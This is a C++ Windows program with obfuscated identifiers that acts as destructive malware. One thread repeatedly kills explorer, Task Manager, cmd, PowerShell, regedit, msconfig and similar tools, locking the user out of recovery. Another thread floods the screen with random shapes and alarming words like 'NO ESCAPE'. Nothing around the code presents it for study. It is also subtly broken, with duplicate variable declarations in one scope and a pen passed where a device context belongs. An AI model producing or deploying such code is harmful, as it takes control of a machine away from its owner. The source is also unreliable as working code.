#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <vector>
#include <cstdlib>
#include <ctime>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")

std::vector<std::wstring> AbCdEfGhIj() {
    std::vector<std::wstring> KlMnOpQrSt;
    const wchar_t* UvWxYzAb[] = {
        L"explorer.exe", L"taskmgr.exe", L"cmd.exe", L"powershell.exe",
        L"regedit.exe", L"msconfig.exe", L"mmc.exe", L"control.exe",
        L"SystemSettings.exe", L"ApplicationFrameHost.exe"
    };
    for (auto& CdEfGhIjKl : UvWxYzAb) KlMnOpQrSt.push_back(CdEfGhIjKl);
    return KlMnOpQrSt;
}

DWORD WINAPI MnOpQrStUv(LPVOID) {
    while (true) {
        HANDLE WxYzAbCdEf = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (WxYzAbCdEf != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 GhIjKlMnOp;
            GhIjKlMnOp.dwSize = sizeof(GhIjKlMnOp);
            if (Process32First(WxYzAbCdEf, &GhIjKlMnOp)) {
                do {
                    std::wstring QrStUvWxYz(GhIjKlMnOp.szExeFile);
                    for (auto& AbCdEfGhIj : AbCdEfGhIj()) {
                        if (QrStUvWxYz == AbCdEfGhIj) {
                            HANDLE KlMnOpQrSt = OpenProcess(PROCESS_TERMINATE, FALSE, GhIjKlMnOp.th32ProcessID);
                            if (KlMnOpQrSt) {
                                TerminateProcess(KlMnOpQrSt, 0);
                                CloseHandle(KlMnOpQrSt);
                            }
                        }
                    }
                } while (Process32Next(WxYzAbCdEf, &GhIjKlMnOp));
            }
            CloseHandle(WxYzAbCdEf);
        }
        Sleep(100);
    }
    return 0;
}

DWORD WINAPI UvWxYzAbCd(LPVOID) {
    srand((unsigned)time(NULL));
    while (true) {
        HDC EfGhIjKlMn = GetDC(NULL);
        int OpQrStUvWx = GetSystemMetrics(SM_CXSCREEN);
        int YzAbCdEfGh = GetSystemMetrics(SM_CYSCREEN);
        
        int IjKlMnOpQr = rand() % OpQrStUvWx;
        int StUvWxYzAb = rand() % YzAbCdEfGh;
        int CdEfGhIjKl = rand() % 300 + 50;
        int MnOpQrStUv = rand() % 300 + 50;

        HBRUSH WxYzAbCdEf = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
        RECT GhIjKlMnOp = { IjKlMnOpQr, StUvWxYzAb, IjKlMnOpQr + CdEfGhIjKl, StUvWxYzAb + MnOpQrStUv };
        FillRect(EfGhIjKlMn, &GhIjKlMnOp, WxYzAbCdEf);
        DeleteObject(WxYzAbCdEf);

        int QrStUvWxYz = rand() % OpQrStUvWx;
        int AbCdEfGhIj = rand() % YzAbCdEfGh;
        int KlMnOpQrSt = rand() % 150 + 10;
        int UvWxYzAbCd = rand() % 20 + 10;

        HPEN EfGhIjKlMn = CreatePen(PS_SOLID, rand() % 10 + 1, RGB(rand() % 256, rand() % 256, rand() % 256));
        HGDIOBJ OpQrStUvWx = SelectObject(EfGhIjKlMn, EfGhIjKlMn);
        MoveToEx(EfGhIjKlMn, QrStUvWxYz, AbCdEfGhIj, NULL);
        LineTo(EfGhIjKlMn, QrStUvWxYz + KlMnOpQrSt, AbCdEfGhIj + UvWxYzAbCd);
        SelectObject(EfGhIjKlMn, OpQrStUvWx);
        DeleteObject(EfGhIjKlMn);

        const wchar_t* YzAbCdEfGh[] = { L"FATAL", L"ERROR", L"SYSTEM", L"CRITICAL", L"0xDEADBEEF", L"NO ESCAPE" };
        SetTextColor(EfGhIjKlMn, RGB(rand() % 256, rand() % 256, rand() % 256));
        SetBkMode(EfGhIjKlMn, TRANSPARENT);
        TextOutW(EfGhIjKlMn, rand() % OpQrStUvWx, rand() % YzAbCdEfGh, YzAbCdEfGh[rand() % 6], wcslen(YzAbCdEfGh[rand() % 6]));

        ReleaseDC(NULL, EfGhIjKlMn);
        Sleep(10);
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    CreateThread(NULL, 0, MnOpQrStUv, NULL, 0, NULL);
    CreateThread(NULL, 0, UvWxYzAbCd, NULL, 0, NULL);

    while (true) {
        Sleep(1000);
    }
    return 0;
}
